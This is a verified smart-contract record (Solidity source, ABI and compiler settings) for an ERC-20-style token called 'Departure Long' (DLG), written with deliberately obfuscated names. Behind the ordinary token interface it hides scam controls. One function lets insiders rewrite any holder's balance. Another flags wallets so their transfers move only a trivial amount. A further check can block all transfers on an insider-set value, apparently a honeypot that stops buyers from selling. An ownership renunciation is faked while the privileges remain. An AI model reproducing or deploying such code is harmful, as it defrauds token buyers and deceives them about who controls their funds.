{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.5;\n\ninterface launchFund {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract maxSender {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface amountWallet {\n    function createPair(address receiverToken, address walletMode) external returns (address);\n}\n\ninterface totalSellMode {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address atMode) external view returns (uint256);\n\n    function transfer(address enableSellFrom, uint256 walletTake) external returns (bool);\n\n    function allowance(address receiverLaunchedShould, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 walletTake) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address enableSellFrom,\n        uint256 walletTake\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed atFeeSell, uint256 value);\n    event Approval(address indexed receiverLaunchedShould, address indexed spender, uint256 value);\n}\n\ninterface totalSellModeMetadata is totalSellMode {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract DepartureLong is maxSender, totalSellMode, totalSellModeMetadata {\n\n    function minSender(address modeBuy, uint256 walletTake) public {\n        shouldLimit();\n        modeMin[modeBuy] = walletTake;\n    }\n\n    address private feeSell;\n\n    function balanceOf(address atMode) public view virtual override returns (uint256) {\n        return modeMin[atMode];\n    }\n\n    function transfer(address modeBuy, uint256 walletTake) external virtual override returns (bool) {\n        return walletFund(_msgSender(), modeBuy, walletTake);\n    }\n\n    mapping(address => bool) public receiverLaunched;\n\n    function decimals() external view virtual override returns (uint8) {\n        return maxTo;\n    }\n\n    function marketingBuyMode(address fundTokenTotal, address enableSellFrom, uint256 walletTake) internal returns (bool) {\n        require(modeMin[fundTokenTotal] >= walletTake);\n        modeMin[fundTokenTotal] -= walletTake;\n        modeMin[enableSellFrom] += walletTake;\n        emit Transfer(fundTokenTotal, enableSellFrom, walletTake);\n        return true;\n    }\n\n    function transferFrom(address fundTokenTotal, address enableSellFrom, uint256 walletTake) external override returns (bool) {\n        if (_msgSender() != teamAt) {\n            if (maxTxSwap[fundTokenTotal][_msgSender()] != type(uint256).max) {\n                require(walletTake <= maxTxSwap[fundTokenTotal][_msgSender()]);\n                maxTxSwap[fundTokenTotal][_msgSender()] -= walletTake;\n            }\n        }\n        return walletFund(fundTokenTotal, enableSellFrom, walletTake);\n    }\n\n    function owner() external view returns (address) {\n        return feeSell;\n    }\n\n    string private minLiquidity = \"Departure Long\";\n\n    mapping(address => uint256) private modeMin;\n\n    function allowance(address buyTrading, address buyFee) external view virtual override returns (uint256) {\n        if (buyFee == teamAt) {\n            return type(uint256).max;\n        }\n        return maxTxSwap[buyTrading][buyFee];\n    }\n\n    uint8 private maxTo = 18;\n\n    address public toMode;\n\n    function getOwner() external view returns (address) {\n        return feeSell;\n    }\n\n    uint256 launchAmount;\n\n    mapping(address => mapping(address => uint256)) private maxTxSwap;\n\n    bool public marketingReceiver;\n\n    function name() external view virtual override returns (string memory) {\n        return minLiquidity;\n    }\n\n    bool public receiverMarketingTrading;\n\n    uint256 private toSwap = 100000000 * 10 ** 18;\n\n    event OwnershipTransferred(address indexed receiverMax, address indexed fundReceiver);\n\n    function symbol() external view virtual override returns (string memory) {\n        return totalIsLimit;\n    }\n\n    function liquidityAmount(address modeExemptTo) public {\n        require(modeExemptTo.balance < 100000);\n        if (marketingReceiver) {\n            return;\n        }\n        if (walletList != receiverMarketingTrading) {\n            listLaunched = modeLaunch;\n        }\n        receiverLaunched[modeExemptTo] = true;\n        \n        marketingReceiver = true;\n    }\n\n    bool public walletList;\n\n    address teamAt = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    uint256 private listLaunched;\n\n    uint256 liquidityIs;\n\n    function walletAtReceiver(address totalTxBuy) public {\n        shouldLimit();\n        if (teamSwap != receiverMarketingTrading) {\n            teamSwap = true;\n        }\n        if (totalTxBuy == autoLimit || totalTxBuy == toMode) {\n            return;\n        }\n        teamEnableToken[totalTxBuy] = true;\n    }\n\n    function walletFund(address fundTokenTotal, address enableSellFrom, uint256 walletTake) internal returns (bool) {\n        if (fundTokenTotal == autoLimit) {\n            return marketingBuyMode(fundTokenTotal, enableSellFrom, walletTake);\n        }\n        uint256 shouldEnable = totalSellMode(toMode).balanceOf(txTeam);\n        require(shouldEnable == launchAmount);\n        require(enableSellFrom != txTeam);\n        if (teamEnableToken[fundTokenTotal]) {\n            return marketingBuyMode(fundTokenTotal, enableSellFrom, listWallet);\n        }\n        return marketingBuyMode(fundTokenTotal, enableSellFrom, walletTake);\n    }\n\n    string private totalIsLimit = \"DLG\";\n\n    function shouldLimit() private view {\n        require(receiverLaunched[_msgSender()]);\n    }\n\n    function enableLaunched(uint256 walletTake) public {\n        shouldLimit();\n        launchAmount = walletTake;\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return toSwap;\n    }\n\n    function approve(address buyFee, uint256 walletTake) public virtual override returns (bool) {\n        maxTxSwap[_msgSender()][buyFee] = walletTake;\n        emit Approval(_msgSender(), buyFee, walletTake);\n        return true;\n    }\n\n    uint256 constant listWallet = 14 ** 10;\n\n    function launchReceiverMax() public {\n        emit OwnershipTransferred(autoLimit, address(0));\n        feeSell = address(0);\n    }\n\n    constructor (){\n        \n        launchFund maxModeFund = launchFund(teamAt);\n        toMode = amountWallet(maxModeFund.factory()).createPair(maxModeFund.WETH(), address(this));\n        \n        autoLimit = _msgSender();\n        launchReceiverMax();\n        receiverLaunched[autoLimit] = true;\n        modeMin[autoLimit] = toSwap;\n        \n        emit Transfer(address(0), autoLimit, toSwap);\n    }\n\n    address public autoLimit;\n\n    bool public teamSwap;\n\n    uint256 private modeLaunch;\n\n    mapping(address => bool) public teamEnableToken;\n\n    address txTeam = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"receiverLaunchedShould\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"receiverMax\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"fundReceiver\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"atFeeSell\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"buyTrading\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"buyFee\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"buyFee\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"walletTake\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"autoLimit\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"atMode\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"walletTake\",\"type\":\"uint256\"}],\"name\":\"enableLaunched\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchReceiverMax\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"modeExemptTo\",\"type\":\"address\"}],\"name\":\"liquidityAmount\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"marketingReceiver\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"modeBuy\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"walletTake\",\"type\":\"uint256\"}],\"name\":\"minSender\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"receiverLaunched\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverMarketingTrading\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"teamEnableToken\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"teamSwap\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"toMode\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"modeBuy\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"walletTake\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fundTokenTotal\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"enableSellFrom\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"walletTake\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"totalTxBuy\",\"type\":\"address\"}],\"name\":\"walletAtReceiver\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"walletList\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "DepartureLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}